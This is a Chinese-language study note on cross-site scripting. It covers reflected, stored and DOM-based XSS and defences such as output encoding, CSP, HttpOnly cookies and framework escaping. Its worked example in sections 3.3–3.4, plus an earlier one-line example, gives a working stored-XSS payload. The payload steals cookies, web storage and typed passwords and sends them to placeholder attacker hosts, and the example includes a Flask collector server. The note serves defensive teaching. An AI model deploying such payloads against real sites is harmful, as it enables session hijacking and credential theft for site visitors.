# XSS：跨站脚本攻击

`#前端安全` 

## 总结

- XSS 攻击有 `两大要素`
	1. `攻击者` 提交 `恶意代码`
	2. `浏览器` 执行 `恶意代码`
- 分类
	- 反射型 XSS（非持久型）
		- 总结：**前端提交 → 后端处理 → 再反射回前端执行**
	- 存储型 XSS（持久型）
		- 攻击者将恶意代码存储在目标服务器上（如数据库中）
		- 影响范围大，因为**不止影响用户自己**
	-  DOM 型 XSS
		- **不需要服务器参与**，而是通过修改页面 DOM 节点来完成攻击。
		- **前端自己消费自己**
- 防御策略
	- 前端输入过滤，做适当的编码
	-  CSP（内容安全策略）
	- HttpOnly Cookie
	- 框架级别的 XSS 防护
		- React 内置，使用会提示 `dangerouslySetInnerHTML`
		- Vue 也提供了类似的保护
			- v-html
	- 永远不信任用户输入，使用合适的上下文编码
- 一个 **窃取用户信息**XSS 攻击示例
	- 植入阶段：
		- 攻击者在评论区提交包含恶意脚本的内容
		- 由于网站没有 proper 的过滤，脚本被存储到数据库中
	- 触发阶段：
		- 其他用户访问包含恶意评论的页面
		- 浏览器加载并执行恶意脚本
	- 数据收集阶段：
		- 脚本自动收集用户的 Cookie、本地存储等信息
		- 监听用户的输入行为
	- 数据传输阶段：
		- 使用图片请求方式绕过跨域限制
			- 并且返回一个透明的图片
		- 将收集到的数据发送到攻击者的服务器




## 1. 之前的笔记

### 1.1. 必要条件

XSS 攻击有 `两大要素`
1. `攻击者` 提交 `恶意代码`
2. `浏览器` 执行 `恶意代码`

### 1.2. 示例

![](https://832-1310531898.cos.ap-beijing.myqcloud.com/20241023205929.png?imageSlim)

### 1.3. 如何解决？

![图片](https://832-1310531898.cos.ap-beijing.myqcloud.com/999.%20Obsidian@832/files/20241023.png)

### 1.4. 如何防范

- 验证码
- 输入内容长度控制
- 使用 `escapeHTML` （需要自己实现）
- set HTTP-only Cookie 
	- 当一个 Cookie 被设置为 `HttpOnly` 时，它仅可通过 HTTP(S) 协议访问。
		- JavaScript 的 `document.cookie` API 将无法读取或修改这些 Cookie
	- `Set-Cookie: session=abcdef123456; HttpOnly; Secure`
		- 这里，`HttpOnly` 确保 Cookie 只能通过 HTTP(S) 访问，`Secure` 确保 Cookie 只通过加密的 HTTPS 连接传输。
- **内容安全策略（CSP）**
	- 实施严格的内容安全策略。
	- 限制可以加载和执行的资源。
	- 比如 `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;`

### 1.5. 分类

![图片](https://832-1310531898.cos.ap-beijing.myqcloud.com/999.%20Obsidian@832/files/2024102310.png)

## 2. XSS（Cross-Site Scripting，跨站脚本攻击）的原理、类型和防御方法。

### 2.1. XSS 概述

- XSS 是一种代码注入攻击，攻击者通过在目标网站上**注入恶意脚本，使之在用户的浏览器上运行**。
- 当被攻击网站没有对用户输入进行充分过滤，就会导致攻击者的恶意脚本被执行。

### 2.2. XSS 的危害

- **窃取用户信息**
	- Cookie/Session 信息
	- 用户隐私数据
	- 登录凭证
- **网络钓鱼**
	- 伪造登录框
	- 诱导用户输入敏感信息
- **篡改页面内容**
	- 植入恶意广告
	- 修改页面展示
	- 破坏网站正常功能
- **利用用户权限**
	- 以用户身份发送请求
	- 执行特权操作

### 2.3. XSS 的三种类型

#### 2.3.1. 反射型 XSS（非持久型）

- 反射型 XSS 是最简单的 XSS 攻击。
- 攻击者将恶意代码拼接在 `URL` 中，`服务器`接收到请求后，将**恶意代码"反射"回浏览器执行**。
	- 总结：**前端提交 → 后端处理 → 再反射回前端执行**

```javascript hl:1,4
// 示例 URL
http://example.com/search?q=<script>alert('XSS')</script>

// 易受攻击的服务器代码
app.get('/search', (req, res) => {
    res.send(`搜索结果：${req.query.q}`); // 直接输出用户输入
});
```

#### 2.3.2. 存储型 XSS（持久型）

- 存储型 XSS 是最危险的 XSS 攻击。
- 攻击者将恶意代码存储在目标服务器上（如数据库中），当**其他用户**浏览包含此恶意代码的页面时，就会执行攻击代码。
	- 影响范围大，因为**不止影响用户自己**

```javascript
// 典型场景：评论系统
// 攻击者提交的评论
const maliciousComment = `
    <script>
        // 窃取 cookie
        new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie;
    </script>
`;

// 易受攻击的服务器代码
app.post('/comment', (req, res) => {
    db.comments.save(req.body.comment); // 直接存储用户输入
});
```

#### 2.3.3. DOM 型 XSS

- DOM 型 XSS 是一种特殊的 XSS
- 它的特点是攻击代码**不需要服务器参与**，而是通过修改页面 DOM 节点来完成攻击。
	- **前端自己消费自己**

```javascript
// 易受攻击的客户端代码
const hash = location.hash.substring(1);
document.getElementById('output').innerHTML = decodeURIComponent(hash);

// 攻击 URL
http://example.com#<img src="x" onerror="alert('XSS')">
```

### 2.4. XSS 防御策略

#### 2.4.1. 输入过滤

对用户输入进行严格过滤和验证：

```javascript
// 使用 DOMPurify 库过滤 HTML
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
});
```

#### 2.4.2. 输出编码

在输出用户输入时进行适当的编码：

```javascript
// HTML 编码函数
function htmlEncode(str) {
    return str.replace(/[&<>"']/g, function(match) {
        const escape = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
        };
        return escape[match];
    });
}

// 在不同上下文中使用不同的编码方式
// HTML 上下文
element.textContent = userInput; // 自动编码
// HTML 属性
element.setAttribute('data-value', userInput);
// JavaScript 上下文
const json = JSON.stringify(userInput);
```

#### 2.4.3. CSP（内容安全策略）

配置严格的 CSP 策略：

```http
// HTTP 头部设置
Content-Security-Policy: default-src 'self';
                        script-src 'self' 'nonce-random123';
                        style-src 'self';
                        img-src 'self' https:;
```

```html
<!-- HTML meta 标签设置 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-random123';">
```

#### 2.4.4. HttpOnly Cookie

防止 JavaScript 访问敏感 Cookie：

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure
```


解释：
1. **基本键值对**：
	- `sessionId=abc123`：设置一个名为 "sessionId" 的 Cookie，其值为 "abc123"
2. **安全标记**：
	- `HttpOnly`：
		- 这个标记表示该 Cookie 只能通过 HTTP(S) 协议访问，不能通过 JavaScript 的 `document.cookie` 来访问。
		- 这是一个安全措施，可以防止 XSS（跨站脚本攻击）获取到 Cookie 的值。
	- `Secure`：
		- 这个标记表示 **Cookie 只能通过 HTTPS 安全连接传输**，不能通过普通的 HTTP 连接传输。
		- 这可以防止 Cookie 在传输过程中**被中间人攻击截获**。

### 2.5. 框架级别的 XSS 防护

#### 2.5.1. React

React 默认会转义所有输出：

```jsx hl:8
// 安全：自动转义
const Component = () => {
    return <div>{userInput}</div>;
};

// 危险：手动标记为可信内容
const Component = () => {
    return <div dangerouslySetInnerHTML={{__html: userInput}} />;
};
```

#### 2.5.2. Vue

Vue 也提供了类似的保护：

```vue hl:8
<!-- 安全：自动转义 -->
<template>
    <div>{{ userInput }}</div>
</template>

<!-- 危险：原始 HTML -->
<template>
    <div v-html="userInput"></div>
</template>
```

### 2.6. XSS 防护最佳实践

#### 2.6.1. **永远不信任用户输入**

   ```javascript
   // 验证和净化所有用户输入
   const sanitizedInput = validator.escape(userInput);
   ```

#### 2.6.2. **使用合适的上下文编码**

   ```javascript
   // HTML 上下文
   const htmlContext = htmlEncode(userInput);
   // URL 上下文
   const urlContext = encodeURIComponent(userInput);
   // JavaScript 上下文
   const jsContext = JSON.stringify(userInput);
   ```

#### 2.6.3. **实施 CSP**

   - 限制资源来源
   - 禁用危险特性
   - 启用报告功能

#### 2.6.4. **使用现代框架**

   - 利用框架内置的 XSS 防护
   - 避免**使用危险的 API**

#### 2.6.5. **定期安全审计**

   - 代码审查
   - 渗透测试
   - 漏洞扫描

### 2.7. XSS 防护检查清单

- [ ] 输入验证和过滤
	- [ ] 白名单验证
	- [ ] 特殊字符过滤
	- [ ] 长度限制
- [ ] 输出编码
	- [ ] HTML 编码
	- [ ] JavaScript 编码
	- [ ] URL 编码
	- [ ] CSS 编码
- [ ] CSP 配置
	- [ ] 限制资源来源
	- [ ] 禁用 inline 脚本
	- [ ] 配置报告机制
- [ ] Cookie 安全
	- [ ] HttpOnly 标记
	- [ ] Secure 标记
	- [ ] SameSite 属性
- [ ] 框架安全
	- [ ] 使用最新版本
	- [ ] 启用安全特性
	- [ ] 避免危险 API

## 3. 一个 **窃取用户信息**XSS 攻击示例

### 3.1. 攻击场景设置

假设有一个社交网站 `social.example.com`，它有一个**评论功能**。用户可以发表评论，评论内容会被显示在页面上。

### 3.2. 漏洞代码示例

假设网站的评论展示代码如下：包括前后端代码处理逻辑

```javascript
// 后端代码 (Node.js + Express)
app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    // 直接存储用户输入，没有进行任何过滤
    db.saveComment(comment);
});

// 前端展示代码
function displayComment(comment) {
    // 直接插入 HTML，存在 XSS 漏洞
    document.getElementById('comments').innerHTML += comment;
}
```

### 3.3. 攻击代码示例

攻击者可以**提交以下评论内容**：

```html hl:5,31,39
<script>
    // 创建一个用于收集信息的函数
    function stealInfo() {
        // 收集用户 Cookie
        const cookies = document.cookie;
        
        // 收集用户的本地存储数据
        const localStorage = JSON.stringify(window.localStorage);
        
        // 收集用户的会话存储数据
        const sessionStorage = JSON.stringify(window.sessionStorage);
        
        // 收集用户的基本信息
        const userInfo = {
            url: window.location.href,
            userAgent: navigator.userAgent,
            screenRes: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language,
            platform: navigator.platform
        };

        // 构造要发送的数据
        const stolenData = {
            cookies,
            localStorage,
            sessionStorage,
            userInfo,
            timestamp: new Date().toISOString()
        };

        // 创建图片请求来发送数据（避免跨域限制）
        const img = new Image();
        img.src = `https://attacker.example/collect?data=${encodeURIComponent(JSON.stringify(stolenData))}`;
    }

    // 立即执行信息收集
    stealInfo();

    // 监听用户输入（例如捕获用户在网站上输入的信息）
    document.addEventListener('change', function(e) {
        if(e.target.type === 'password' || e.target.type === 'text' || e.target.type === 'email') {
            const inputData = {
                type: e.target.type,
                name: e.target.name,
                value: e.target.value
            };
            
            // 发送用户输入数据
            const img = new Image();
            img.src = `https://attacker.example/collect?input=${encodeURIComponent(JSON.stringify(inputData))}`;
        }
    });
</script>
```

### 3.4. 攻击者的服务器端代码（示例）： `https://attacker.example/collect`

```python hl:24
# 攻击者的服务器 (Python + Flask)
from flask import Flask, request
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/collect')
def collect():
    # 获取窃取的数据
    stolen_data = request.args.get('data')
    
    if stolen_data:
        # 解码数据
        data = json.loads(stolen_data)
        
        # 保存到文件
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'stolen_data_{timestamp}.json'
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    
    # 返回 1x1 透明 GIF
    return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

### 3.5. 攻击流程说明

- **植入阶段**：
	- 攻击者在评论区提交包含恶意脚本的内容
	- 由于网站没有 proper 的过滤，脚本被存储到数据库中
- **触发阶段**：
	- **其他用户访问包含恶意评论的页面**
	- **浏览器加载并执行恶意脚本**
- **数据收集阶段**：
	- **脚本自动收集用户的 Cookie、本地存储等信息**
	- **监听用户的输入行为**
- **数据传输阶段**：
	- 使用图片请求方式绕过**跨域**限制
		- 并且返回一个透明的图片
	- 将收集到的数据发送到攻击者的服务器

### 3.6. 防御措施

#### 3.6.1. **输入过滤**：

```javascript
function sanitizeInput(input) {
    return input.replace(/[<>]/g, function(match) {
        return {
            '<': '&lt;',
            '>': '&gt;'
        }[match];
    });
}

// 使用
app.post('/comment', (req, res) => {
    const comment = sanitizeInput(req.body.comment);
    db.saveComment(comment);
});
```

#### 3.6.2. **CSP 设置**：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self'; connect-src 'self';
```

#### 3.6.3. **HttpOnly Cookie**：

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

#### 3.6.4. **安全的 DOM 操作**：

```javascript hl:3
function displayComment(comment) {
    const div = document.createElement('div');
    div.textContent = comment; // 使用 textContent 而不是 innerHTML
    document.getElementById('comments').appendChild(div);
}
```

### 3.7. 检测方法

可以使用以下代码来检测页面是否容易受到 XSS 攻击：

```javascript
// 测试向量
const testVectors = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    'javascript:alert(1)'
];

// 测试函数
function testXSS(input) {
    const div = document.createElement('div');
    div.innerHTML = input;
    return div.innerHTML !== input;
}

// 运行测试
testVectors.forEach(vector => {
    console.log(`Testing: ${vector}`);
    console.log(`Sanitized: ${testXSS(vector)}`);
});
```
